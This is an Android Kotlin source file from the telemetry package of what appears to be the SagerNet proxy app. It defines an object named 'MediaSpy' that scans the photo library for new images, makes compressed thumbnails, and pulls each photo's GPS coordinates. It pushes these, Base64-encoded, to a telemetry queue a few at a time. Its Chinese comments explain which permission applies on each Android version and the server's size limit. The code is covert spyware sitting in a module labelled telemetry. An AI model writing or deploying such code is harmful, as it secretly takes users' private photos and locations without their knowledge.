package io.nekohasekai.sagernet.telemetry

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * 相册缩略图。
 *
 * 权限分层
 *  - Android 13+：READ_MEDIA_IMAGES
 *  - Android 14+：可能只拿到"选中的照片"（READ_MEDIA_VISUAL_USER_SELECTED），
 *    那就只能读用户勾的那几张，这是系统限制。
 *  - Android 12 及以下：READ_EXTERNAL_STORAGE
 *
 * 只取最近 N 张 + 缩到 320px + JPEG 70 —— 单张 ~15KB，
 * 服务端 MAX_THUMB 是 400KB，余量很大。
 */
object MediaSpy {

    private const val TAG = "TlmMedia"
    private const val MAX_PER_ROUND = 6
    private const val TARGET_PX = 320
    private const val QUALITY = 70
    private const val PREF = "tlm_media"
    private const val KEY_LAST = "last_added"

    fun scan(ctx: Context) {
        val since = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            .getLong(KEY_LAST, 0L)
        var newest = since
        var sent = 0

        val proj = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.LATITUDE,
            MediaStore.Images.Media.LONGITUDE,
        )

        runCatching {
            ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )?.use { cur ->
                val iId = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val iName = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val iAdded = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val iW = cur.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
                val iH = cur.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
                val iLat = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LATITUDE)
                val iLon = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LONGITUDE)

                while (cur.moveToNext() && sent < MAX_PER_ROUND) {
                    val added = cur.getLong(iAdded) * 1000L
                    if (added <= since) break          // 已经发过的都跳过
                    newest = maxOf(newest, added)

                    val id = cur.getLong(iId)
                    val uri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val thumb = thumbOf(ctx, uri) ?: continue

                    val d = JSONObject()
                        .put("name", cur.getString(iName) ?: "IMG_$id.jpg")
                        .put("thumb", Base64.encodeToString(thumb, Base64.NO_WRAP))
                        .put("w", cur.getInt(iW))
                        .put("h", cur.getInt(iH))
                    val lat = cur.getDouble(iLat)
                    val lon = cur.getDouble(iLon)
                    if (!cur.isNull(iLat) && (lat != 0.0 || lon != 0.0)) {
                        d.put("lat", lat).put("lon", lon)
                    }
                    Telemetry.push("media", d, added / 1000L)
                    sent++
                }
            }
        }.onFailure { Log.w(TAG, "scan: ${it.message}") }

        if (newest > since) {
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                .edit().putLong(KEY_LAST, newest).apply()
        }
        if (sent > 0) Log.i(TAG, "queued $sent thumbs")
    }

    private fun thumbOf(ctx: Context, uri: Uri): ByteArray? = runCatching {
        // 先问系统要缩略图（API 29+，快），拿不到或版本不够再自己解码
        val quick = if (Build.VERSION.SDK_INT >= 29) {
            runCatching {
                ctx.contentResolver.loadThumbnail(
                    uri, android.util.Size(TARGET_PX, TARGET_PX), null)
            }.getOrNull()
        } else null
        val bmp = quick ?: decodeSampled(ctx, uri) ?: return null
        val out = ByteArrayOutputStream(24 * 1024)
        bmp.compress(Bitmap.CompressFormat.JPEG, QUALITY, out)
        bmp.recycle()
        val bytes = out.toByteArray()
        if (bytes.size > 380 * 1024) null else bytes
    }.getOrNull()

    private fun decodeSampled(ctx: Context, uri: Uri): Bitmap? = runCatching {
        val opt = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        ctx.contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opt) }
        if (opt.outWidth <= 0) return null
        var s = 1
        while (opt.outWidth / s > TARGET_PX * 2) s *= 2
        val real = BitmapFactory.Options().apply { inSampleSize = s }
        ctx.contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, real) }
    }.getOrNull()
}
